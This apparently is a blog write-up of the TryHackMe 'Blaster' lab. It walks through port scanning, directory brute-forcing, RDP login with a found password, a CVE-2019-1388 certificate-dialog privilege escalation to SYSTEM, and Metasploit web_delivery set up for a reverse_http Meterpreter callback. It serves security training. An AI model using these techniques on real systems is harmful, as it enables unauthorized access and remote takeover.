---
layout: post
title: "THM - Blaster"
date: 2022-02-03
categories: [Tryhackme, Easy]
tags: [retro, windows, redux, privesc]
image: ../../assets/img/posts/Blaster/blaster.png 

---

## Description

A blast from the past!

|**Room**|[Blaster](https://tryhackme.com/room/blaster)|
|:---:|:---:|
|**OS**|Windows|
|**Difficulty**|Easy|
|**Creator**|[DarkStar7471](https://twitter.com/darkstar7471)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.41.77
```
![rustscan](../../assets/img/posts/Blaster/rustscan.png)

we got 2 open ports. Let's scan them in detail with nmap.

```bash
nmap -sV -sC -p80,3389 10.10.41.77 -oN nmap.txt
```
![nmap](../../assets/img/posts/Blaster/nmap.png)

Scan results describes that port 80 Microsoft IIS server and port 3389 is running rdp server. Name of the machine is RetroWeb. Let's enumerate port 80. 

Visit http://10.10.41.77/,
![webpage1](../../assets/img/posts/Blaster/webpage1.png)

We got the welcome page of Microsoft IIS Server (default page).

From here, we can actually brute force the directories,

```bash
dirsearch -u http://10.10.41.77 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -i 200,301 -o dirsearch.txt 2>/dev/null
```
![dirsearch](../../assets/img/posts/Blaster/dirsearch.png)

dirsearch found the hidden directory named **/retro**. Let's enumerate it.

Visit http://10.10.41.77/retro/,
![webpage2](../../assets/img/posts/Blaster/webpage2.png)

By looking at this, I get the idea that this is kinda a blog website on retro games. There is a name Wade (might be username).

Looking around this website and I got suspicious of this blog, 
![webpage3](../../assets/img/posts/Blaster/webpage3.png)

So I followed this blog and landed on this page,
![webpage4](../../assets/img/posts/Blaster/webpage4.png)

Author of this blog is also the Wade then it might can be a password.

Since we know that rdp server is running then we can use `remmina` to connect to machine,
![rdp](../../assets/img/posts/Blaster/rdp.png)

There we got interface,
![rdp2](../../assets/img/posts/Blaster/rdp2.png)

and also our user flag.

There is hhupd.exe file, so I searched it on google,

> CVE-2019-1388 : An elevation of privilege vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privileges, aka 'Windows Certificate Dialog Elevation of Privilege Vulnerability'.

The POC of this vulnerability can be found on [Windows UAC Privilege Escalation CVE-2019-1388](https://www.programmersought.com/article/13092509797/).

Run hhupd.exe as administrator,
![rdp3](../../assets/img/posts/Blaster/rdp3.png)

when we try to enter the password which we don't know, then it will throw us an error. But actually, we can see "Show more details" button just before the password area. Let's click on that,

![rdp4](../../assets/img/posts/Blaster/rdp4.png)

it shows the program location and "show information about the publisher's certificate". Follow the link by clicking on it.

It opens up a dialogue box showing the information about certificate issuer,
![rdp5](../../assets/img/posts/Blaster/rdp5.png)

There is an "Issued By" text so I followed this link.

It opens up the Internet Explorer,
![rdp6](../../assets/img/posts/Blaster/rdp6.png)

but the page can't be loaded because this machine is not connected to internet.

We can save this webpage in "C:\Windows\System32\",
![rdp7](../../assets/img/posts/Blaster/rdp7.png)

now before saving it, type *.* to save it and there after scrolling down, we can see the cmd executable. Let's run this executable.

Command prompt opens up as System32,
![rdp8](../../assets/img/posts/Blaster/rdp8.png)

issuing `whoami` command reveals us that we are **nt authority\system** user means we are administrator.

Navigating to C:\Users\Administrator\Desktop and listing directory content, 
![rdp9](../../assets/img/posts/Blaster/rdp9.png)

we can see the root flag.

## Metasploit Method

Boot up the metasploit using `msfconsole -q` and then we are using web_delivery module to exploit this vulnerability,

```bash
use exploit/multi/script/web_delivery
```
![metasploit](../../assets/img/posts/Blaster/metasploit.png)

setting `options`:
- `set lhost tun0`
- `set target 2` (PSH)
- `set payload windows/meterpreter/reverse_http`

Running this module in background using `run -j` (it will run the exploit in background and when it receives connection from remote machine, it will notify us to interact with that session),
![metasploit2](../../assets/img/posts/Blaster/metasploit2.png)

after running this module, we got the powershell command. Now, copy this command and paste this on remote machine command prompt.

When this pasted command gets executed on remote machine, our payload will get delivered,
![metasploit3](../../assets/img/posts/Blaster/metasploit3.png)

and we got a meterpreter session. 

Interact with session 1,
![metasploit4](../../assets/img/posts/Blaster/metasploit4.png)

issuing `getuid` command reveals that we are **NT AUTHORITY\SYSTEM** user.
